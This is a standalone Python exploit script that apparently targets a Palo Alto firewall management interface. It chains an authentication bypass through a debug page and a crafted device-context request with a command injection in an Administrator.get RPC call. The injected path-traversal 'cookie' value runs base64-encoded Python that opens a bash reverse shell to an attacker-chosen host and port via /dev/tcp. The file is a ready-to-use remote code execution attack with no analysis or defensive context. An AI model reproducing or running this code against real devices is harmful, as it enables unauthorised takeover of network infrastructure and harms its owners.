import requests
import base64
import sys


def step3_exp(lhost, lport):
    command = base64.b64encode('''exec("import os; os.system('bash -i >& /dev/tcp/{}/{} 0>&1')")'''.format(lhost, lport).encode('utf-8'))
    command=command.decode('utf-8')
    # print(command)
    # print(type(command))
    # print(type(lhost))
    # print(type(lport))
    exp_post = r'''{"action":"PanDirect","method":"execute","data":["07c5807d0d927dcd0980f86024e5208b","Administrator.get",{"changeMyPassword":true,"template":"asd","id":"admin']\" async-mode='yes' refresh='yes'  cookie='../../../../../../../../../tmp/* -print -exec python -c exec(\"'''+ command + r'''\".decode(\"base64\")) ;'/>\u0000"}],"type":"rpc","tid": 713}'''
    # print(exp_post)
    return exp_post


def rce(thost, tport, lhost, lport):
    session = requests.Session()
    url1 = 'https://{}:{}/php/utils/debug.php'.format(thost, tport)
    url2 = 'https://{}:{}/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";'.format(thost, tport)
    url3 = 'https://{}:{}/php/utils/router.php/Administrator.get'.format(thost, tport)

    try:
        if session.get(url1, verify=False).status_code == 200:
            if session.get(url2, verify=False).status_code == 200:
                r = session.get(url1, verify=False)
        if 'Debug Console' in r.text:
            exp_post = step3_exp(lhost, lport)
            response = session.post(url3, data=exp_post).json()
            print(response)
            if response['result']['@status'] == 'success':
                print('[+] success, please wait ... ')
                print('[+] jobID: {}'.format(response['result']['result']['job']))
                return [thost, tport, lhost, lport]
            else:
                return []
        else:
            return []
    except:
        return []


if __name__ == '__main__':
    ret = rce('1.1.1.1', '4443', '192.1.1.1', '1122')
    print(ret)

